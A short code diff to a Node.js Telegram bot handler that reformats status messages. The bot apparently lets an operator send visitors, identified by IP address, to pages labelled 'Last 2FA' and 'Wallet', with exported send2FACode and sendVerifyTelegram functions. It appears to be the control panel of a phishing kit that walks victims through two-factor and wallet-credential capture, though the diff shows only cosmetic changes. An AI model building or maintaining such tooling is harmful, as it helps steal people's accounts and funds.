@@ -277,11 +277,11 @@ bot.on("callback_query", async (query) => {
     // Step 2: Send status below the original message
     let replyText;
     if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `${identifier} has been directed to <b>Done Page 🏁</b>`;
+      replyText = `📍 <code>${identifier}</code> has been directed to <b>Done Page 🏁</b>`;
     } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `${identifier} has been directed to <b>Last 2FA 🔐</b>`;
+      replyText = `📍 <code>${identifier}</code> has been directed to <b>Last 2FA 🔐</b>`;
     } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `${identifier} has been directed to <b>Wallet 💼</b>`;
+      replyText = `📍 <code>${identifier}</code> has been directed to <b>Wallet 💼</b>`;
     } else {
       const isSMS = /^\d+$/.test(identifier);
       replyText = isSMS
@@ -324,4 +324,5 @@ module.exports = {
   sendVerifyTelegram,
   send2FACode
 };
+
 
